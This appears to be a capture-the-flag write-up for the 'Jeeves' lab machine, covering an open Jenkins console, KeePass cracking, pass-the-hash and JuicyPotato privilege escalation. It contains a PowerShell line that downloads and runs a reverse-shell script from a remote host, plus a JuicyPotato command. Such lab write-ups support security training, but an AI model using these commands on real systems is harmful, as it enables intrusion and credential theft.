# jeeves



## nmap



PORT      STATE SERVICE                                                                                                                                                  
80/tcp    open  http                                                                                                                                                     
135/tcp   open  msrpc                                                                                                                                                    
445/tcp   open  microsoft-ds                                                                                                                                             
50000/tcp open  ibm-db2 



## httpenumeration



- nothing interesting was there on port 80 
- we saw a image but its a rabbit-hole
- enumerating port 50000 we find a interesting directory

![image-20200901201822464](jeeves.assets/image-20200901201822464.png)



-  we found a open jenkins console 
- this can lead to command execution as jenkins allows us to execute command

![image-20200901202241631](jeeves.assets/image-20200901202241631.png)



## shell

- we got shell by executing command in script console

![image-20200901213203069](jeeves.assets/image-20200901213203069.png)



- we got a keepass database

![image-20200901213244868](jeeves.assets/image-20200901213244868.png)

- another way of getting shell

```powershell
cmd = " powershell iex(new-object net.webclient).downloadstring('http://10.10.14.37:8000/rev.ps1') "
cmd.execute()
```



![image-20200901221515894](jeeves.assets/image-20200901221515894.png)



- and cracked it with john

![image-20200901213405840](jeeves.assets/image-20200901213405840.png)



## post

- we got a NTLM hash which we used for pass the hash attack

![image-20200901213504161](jeeves.assets/image-20200901213504161.png)

- alternate datastream

![image-20200901213803104](jeeves.assets/image-20200901213803104.png)



#### 2nd method of privesc

- we will juicy potato as we have SeImpersonatePrivilege

![image-20200901214015512](jeeves.assets/image-20200901214015512.png)



```
.\JuicyPotato -l 4445 -p .\shell.bat -t *
```

- we will create a share a try to execute a reverse shell with the arguments in juicy potato

![image-20200901215654421](jeeves.assets/image-20200901215654421.png)



- created a bat file with powershell command and got the shell![image-20200901215728672](jeeves.assets/image-20200901215728672.png)



- we can also use pth-winexe for pass the hash

![image-20200901220257584](jeeves.assets/image-20200901220257584.png)